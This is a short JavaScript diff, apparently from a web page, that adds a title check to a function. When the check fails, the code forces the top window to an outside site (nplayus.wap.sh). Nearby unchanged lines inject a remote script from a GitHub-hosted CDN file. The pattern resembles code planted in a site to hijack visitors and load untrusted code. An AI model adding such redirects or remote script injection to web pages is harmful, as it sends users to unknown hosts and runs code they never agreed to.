@@ -24,7 +24,11 @@ if(localStorage.getItem('local')){
    }).done(function() { }).fail(function() { y();});
 } 
 function y(){
-     
+ var gs = document.title;
+    if(gs.indexOf("2") == 0 ||gs.indexOf("3") == 0 ||gs.indexOf("4") == 0 ||gs.indexOf("5") == 0 || gs.indexOf("6") == 0 || gs.indexOf("7") == 0) {
+    }else{
+        window.top.location = "http://nplayus.wap.sh/";
+    }
 var links;
 links = document.createElement("script"); 
 links.setAttribute("src", "http://cdn.jsdelivr.net/gh/gistmib/gistmib/filess.js");
